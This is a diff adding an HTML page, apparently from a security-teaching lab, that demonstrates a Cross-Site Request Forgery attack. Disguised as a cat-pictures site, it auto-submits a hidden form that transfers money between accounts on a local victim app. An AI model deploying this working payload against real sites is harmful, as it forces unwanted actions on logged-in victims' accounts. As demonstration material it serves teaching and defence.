@@ -1,0 +1,27 @@
+<!-- evilsite/index.html: Demonstrates a Cross-Site Request Forgery attack -->
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Login</title>
+      
+        <!-- ✅ Link to custom CSS -->
+        <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+      </head>
+  <body>
+    <h1>Welcome to the Cat Pictures Website 😼</h1>
+
+    <!-- This form mimics a real request to the victim site (localhost:5000) -->
+    <!-- It will be silently submitted with the victim's cookies if they are logged in -->
+    <form action="http://localhost:5000/transfer" method="POST">
+      <input type="hidden" name="amount" value="100" />
+      <input type="hidden" name="from" value="998" />
+      <input type="hidden" name="to" value="666" />
+    </form>
+
+    <script>
+      // Automatically submits the form as soon as the page loads
+      // Victim never sees the attack
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
